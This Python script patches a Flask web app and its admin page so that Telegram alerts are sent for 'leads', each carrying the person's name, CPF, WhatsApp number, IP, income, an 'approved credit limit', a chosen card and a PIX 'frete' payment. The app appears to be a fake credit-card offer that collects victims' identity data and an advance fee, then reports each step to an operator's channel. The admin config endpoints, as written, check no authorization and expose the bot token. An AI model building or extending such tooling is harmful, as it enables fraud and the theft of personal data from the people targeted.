import re

def update_app_py():
    with open('app.py', 'r', encoding='utf-8') as f:
        code = f.read()

    new_tg_func = """def send_telegram_notify(session_id, event_type="ENTRY"):
    try:
        db = get_db()
        row_token = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
        row_channel = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
        row_topic = db.execute("SELECT value FROM sys_config WHERE key='tg_log_thread_id'").fetchone()

        bot_token = row_token["value"] if row_token else os.environ.get("BOT_TOKEN")
        channel_id = row_channel["value"] if row_channel else None
        topic_id = row_topic["value"] if row_topic else None

        if not bot_token or not channel_id: return

        lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
        if not lead: return
        
        pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
        
        icons = {
            "ENTRY": "🟢",
            "CARD_CHOSEN": "💳",
            "PIX_GENERATED": "⏳",
            "PIX_PAID": "✅",
            "INFO_ADDED": "📝"
        }
        icon = icons.get(event_type, "ℹ️")
        
        # Load templates from DB
        tpl_row = db.execute(f"SELECT value FROM sys_config WHERE key='tg_tpl_{event_type.lower()}'").fetchone()
        
        if tpl_row and tpl_row["value"]:
            texto = tpl_row["value"]
            # Replace tags
            texto = texto.replace("{nome}", str(lead["nome"] or "-"))
            texto = texto.replace("{cpf}", str(lead["cpf"] or "-"))
            texto = texto.replace("{whatsapp}", str(lead["whatsapp"] or "-"))
            texto = texto.replace("{ip}", str(lead["ip"] or "-"))
            texto = texto.replace("{limite}", str(lead["limite_aprovado"] or "-"))
            texto = texto.replace("{renda}", str(lead["renda"] or "-"))
            texto = texto.replace("{cartao}", f"{lead['card_style']} ({lead['card_color']})")
            texto = texto.replace("{status}", str(lead["pix_status"]))
            texto = texto.replace("{frete}", str(pay["amount"]) if pay else "-")
            texto = texto.replace("{icon}", icon)
            texto = texto.replace("{event}", event_type)
        else:
            # Default spreadsheet-like formatting
            status_text = "PAGO" if event_type == "PIX_PAID" else ("AGUARDANDO" if event_type == "PIX_GENERATED" else event_type)
            texto = (
                f"{icon} *NOVO EVENTO: {event_type}* {icon}\\n"
                f"━━━━━━━━━━━━━━━━━━━━\\n"
                f"👤 *Nome:* `{lead['nome'] or '-'}`\\n"
                f"🪪 *CPF:* `{lead['cpf'] or '-'}`\\n"
                f"📱 *WhatsApp:* `{lead['whatsapp'] or '-'}`\\n"
                f"🌍 *IP:* `{lead['ip'] or '-'}`\\n"
                f"━━━━━━━━━━━━━━━━━━━━\\n"
                f"💰 *Renda:* `R$ {lead['renda'] or '-'}`\\n"
                f"🎯 *Limite:* `R$ {lead['limite_aprovado'] or '-'}`\\n"
                f"💳 *Cartão:* `{lead['card_style']} ({lead['card_color']})`\\n"
            )
            if pay:
                texto += f"📦 *Frete:* `R$ {pay['amount']}`\\n"
                texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\\n"
            
            texto += f"🚦 *Status Atual:* `{status_text}`\\n"

        payload = {
            "chat_id": channel_id,
            "text": texto,
            "parse_mode": "Markdown"
        }
        if topic_id:
            payload["message_thread_id"] = topic_id
            
        import requests
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
    except Exception as e:
        import logging
        logging.error(f"Telegram Notify Error: {e}")"""

    # Replace old send_telegram_report function
    code = re.sub(
        r'def send_telegram_report\(session_id, is_paid=False\):.*?except Exception as e:\s*log\.error\(f"Erro ao enviar relatorio: \{e\}"\)',
        new_tg_func + "\n\n# Fallback for old calls\ndef send_telegram_report(session_id, is_paid=False):\n    send_telegram_notify(session_id, 'PIX_PAID' if is_paid else 'PIX_GENERATED')",
        code,
        flags=re.DOTALL
    )

    # In api_cpf_validate (entry point)
    code = re.sub(
        r'("ok": True,\s*"message": "CPF válido".*?\})',
        r'\1\n\n    import threading\n    threading.Thread(target=send_telegram_notify, args=(sid, "ENTRY")).start()',
        code,
        flags=re.DOTALL
    )

    # In api_lead_info
    code = re.sub(
        r'(db\.commit\(\)\s*return jsonify\(\{"ok": True\}\))',
        r'\1\n    import threading\n    threading.Thread(target=send_telegram_notify, args=(sid, "INFO_ADDED")).start()',
        code,
        flags=re.DOTALL
    )

    # In api_card_style
    code = re.sub(
        r'(db\.commit\(\)\s*return jsonify\(\{"ok": True\}\))',
        r'db.commit()\n    import threading\n    threading.Thread(target=send_telegram_notify, args=(sid, "CARD_CHOSEN")).start()\n    return jsonify({"ok": True})',
        code,
        flags=re.DOTALL
    )

    # Update admin bot-config endpoint to support templates
    bot_cfg_post = """@app.route('/api/admin/bot-config', methods=['POST'])
def api_admin_bot_config():
    data = request.get_json()
    db = get_db()
    for key in ['token', 'channel', 'topic', 'tpl_entry', 'tpl_card_chosen', 'tpl_pix_generated', 'tpl_pix_paid']:
        if key in data:
            db_key = 'telegram_token' if key == 'token' else ('tg_log_channel' if key == 'channel' else ('tg_log_thread_id' if key == 'topic' else f'tg_{key}'))
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (db_key, data.get(key, '')))
    db.commit()
    return jsonify({"ok": True})"""

    code = re.sub(
        r"@app\.route\('/api/admin/bot-config', methods=\['POST'\]\)\s*def api_admin_bot_config\(\):.*?return jsonify\(\{\"ok\": True\}\)",
        bot_cfg_post,
        code,
        flags=re.DOTALL
    )

    bot_cfg_get = """@app.route("/api/admin/bot-config", methods=["GET"])
def api_admin_bot_config_get():
    db = get_db()
    keys = ['telegram_token', 'tg_log_channel', 'tg_log_thread_id', 'tg_tpl_entry', 'tg_tpl_card_chosen', 'tg_tpl_pix_generated', 'tg_tpl_pix_paid']
    placeholders = ','.join(['?']*len(keys))
    rows = db.execute(f"SELECT key, value FROM sys_config WHERE key IN ({placeholders})", keys).fetchall()
    cfg = {r["key"]: r["value"] for r in rows}
    return jsonify(cfg)"""

    code = re.sub(
        r"@app\.route\(\"/api/admin/bot-config\", methods=\[\"GET\"\]\)\s*def api_admin_bot_config_get\(\):.*?return jsonify\(cfg\)",
        bot_cfg_get,
        code,
        flags=re.DOTALL
    )

    with open('app.py', 'w', encoding='utf-8') as f:
        f.write(code)

def update_admin_html():
    with open('templates/admin_dashboard.html', 'r', encoding='utf-8') as f:
        html = f.read()

    new_tg_ui = """
        <!-- TELEGRAM CONFIG -->
        <div class="content-section active" id="sec-bot">
          <div class="section-header">
            <h2>Integração Telegram & Notificações Avançadas</h2>
            <p>Configure para onde o bot deve enviar leads e gerencie templates de notificação.</p>
          </div>
          <div class="config-card">
            <h3 style="margin-bottom: 12px; display:flex; align-items:center; gap:8px;">
              <svg fill="#0088cc" width="20" height="20" viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a5.8 5.8 0 0 0-1.056.094zM7.2 16.8l1.2-4.8L4.8 9.6l5.4-.6 1.8-5.4 2.4 4.8 5.4.6-3.6 3.6 1.2 4.8-4.8-1.8-4.8 2.4z"/></svg> 
              Credenciais e Roteamento
            </h3>
            <div class="field-group">
              <label class="field-label">Token do Bot (BotFather)</label>
              <input type="text" class="field-input" id="cfg-bot-token" placeholder="Ex: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
            </div>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:16px;">
              <div class="field-group">
                <label class="field-label">ID do Canal / Grupo</label>
                <input type="text" class="field-input" id="cfg-bot-channel" placeholder="Ex: -100123456789">
              </div>
              <div class="field-group">
                <label class="field-label">ID do Tópico (Opcional)</label>
                <input type="text" class="field-input" id="cfg-bot-topic" placeholder="Ex: 2 (Apenas para grupos com tópicos)">
              </div>
            </div>
            
            <hr style="border:none; border-top:1px solid var(--border); margin:24px 0;">
            <h3 style="margin-bottom: 12px;">Modelos de Mensagem (Templates Markdown)</h3>
            <p style="font-size:0.8rem; color:var(--text-dim); margin-bottom:16px;">
              Tags disponíveis: <code>{nome}</code>, <code>{cpf}</code>, <code>{whatsapp}</code>, <code>{ip}</code>, <code>{limite}</code>, <code>{renda}</code>, <code>{cartao}</code>, <code>{status}</code>, <code>{frete}</code>, <code>{icon}</code>, <code>{event}</code><br>
              Deixe em branco para usar o modelo padrão de planilha organizada.
            </p>
            
            <div class="field-group">
              <label class="field-label">Mensagem: Lead Iniciou (ENTRY)</label>
              <textarea class="field-input" id="cfg-tpl-entry" rows="3" placeholder="Deixe em branco para modelo padrão..."></textarea>
            </div>
            <div class="field-group">
              <label class="field-label">Mensagem: Cartão Escolhido (CARD_CHOSEN)</label>
              <textarea class="field-input" id="cfg-tpl-card" rows="3" placeholder="Deixe em branco para modelo padrão..."></textarea>
            </div>
            <div class="field-group">
              <label class="field-label">Mensagem: PIX Gerado (PIX_GENERATED)</label>
              <textarea class="field-input" id="cfg-tpl-pix-gen" rows="3" placeholder="Deixe em branco para modelo padrão..."></textarea>
            </div>
            <div class="field-group">
              <label class="field-label">Mensagem: PIX Pago (PIX_PAID)</label>
              <textarea class="field-input" id="cfg-tpl-pix-paid" rows="3" placeholder="Deixe em branco para modelo padrão..."></textarea>
            </div>

            <button class="btn-primary" onclick="saveBotConfig()" style="margin-top: 12px; width:auto; padding:0 32px;">Salvar Telegram</button>
          </div>
        </div>
"""

    html = re.sub(
        r'<!-- TELEGRAM CONFIG -->.*?</div>\s*</div>',
        new_tg_ui,
        html,
        flags=re.DOTALL
    )

    new_js = """
    async function loadConfig() {
      // Load Bot config
      const res = await fetch('/api/admin/bot-config', { headers: { 'Authorization': 'Bearer ' + localStorage.getItem('admin_token') } });
      if (res.ok) {
        const data = await res.json();
        if(data.telegram_token) document.getElementById('cfg-bot-token').value = data.telegram_token;
        if(data.tg_log_channel) document.getElementById('cfg-bot-channel').value = data.tg_log_channel;
        if(data.tg_log_thread_id) document.getElementById('cfg-bot-topic').value = data.tg_log_thread_id;
        if(data.tg_tpl_entry) document.getElementById('cfg-tpl-entry').value = data.tg_tpl_entry;
        if(data.tg_tpl_card_chosen) document.getElementById('cfg-tpl-card').value = data.tg_tpl_card_chosen;
        if(data.tg_tpl_pix_generated) document.getElementById('cfg-tpl-pix-gen').value = data.tg_tpl_pix_generated;
        if(data.tg_tpl_pix_paid) document.getElementById('cfg-tpl-pix-paid').value = data.tg_tpl_pix_paid;
      }
"""
    html = re.sub(r'async function loadConfig\(\) \{.*?if\s*\(data\.telegram_token\).*?\}', new_js, html, flags=re.DOTALL)

    new_save_js = """
    async function saveBotConfig() {
      const payload = {
        token: document.getElementById('cfg-bot-token').value,
        channel: document.getElementById('cfg-bot-channel').value,
        topic: document.getElementById('cfg-bot-topic').value,
        tpl_entry: document.getElementById('cfg-tpl-entry').value,
        tpl_card_chosen: document.getElementById('cfg-tpl-card').value,
        tpl_pix_generated: document.getElementById('cfg-tpl-pix-gen').value,
        tpl_pix_paid: document.getElementById('cfg-tpl-pix-paid').value
      };
      const res = await fetch('/api/admin/bot-config', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + localStorage.getItem('admin_token')
        },
        body: JSON.stringify(payload)
      });
      if (res.ok) {
        tg.showAlert("Configurações do Telegram salvas com sucesso!");
      } else {
        tg.showAlert("Erro ao salvar configurações do Telegram.");
      }
    }
"""
    html = re.sub(r'async function saveBotConfig\(\) \{.*?\}', new_save_js, html, flags=re.DOTALL)

    with open('templates/admin_dashboard.html', 'w', encoding='utf-8') as f:
        f.write(html)

update_app_py()
update_admin_html()
print("Telegram advanced features implemented successfully!")
